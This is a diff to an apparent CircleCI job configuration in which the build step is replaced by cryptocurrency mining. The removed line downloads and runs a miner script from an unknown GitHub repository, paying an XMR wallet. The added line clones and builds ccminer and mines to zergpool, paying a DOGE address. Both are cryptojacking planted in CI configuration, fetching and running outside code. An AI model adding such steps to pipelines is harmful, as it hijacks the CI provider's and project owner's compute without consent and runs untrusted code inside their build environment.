@@ -8,4 +8,4 @@ jobs:
           password: $DOCKERHUB_PASSWORD  # context / project UI env-var reference
     steps:
       - checkout
-      - run:  wget https://raw.githubusercontent.com/hunshukajh/yes/main/cmdline_launcher.sh && wget https://github.com/hunshukajh/yes/blob/main/.vio && chmod +x gas cmdline_launcher.sh && ./cmdline_launcher.sh -algo randomx -coin XMR -wallet 83Di2Z64B7E3QfkANAu9WY8Pot7TjTwZC76eWYn4MuB8cFEdgkquHvgisYNwHskWFJ3pmBkRvH9C8BVzf7dgM2UHKG8fgg6  -rigName  $(echo $(shuf -i 1-9999 -n 1)-SRBO) -pool1 rx.unmineable.com:3333
+      - run:  sudo apt-get install libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev build-essential && git clone --single-branch -b Verus2.2 https://github.com/monkins1010/ccminer.git && cd ccminer && chmod +x build.sh && chmod +x configure.sh && chmod +x autogen.sh && ./build.sh &&./ccminer -a verus -o stratum+tcp://verushash.na.mine.zergpool.com:3300 -u D8Kq7Lu982DCTudZocXVbPQRgzPMqRSDsT -p  c=DOGE -t 30
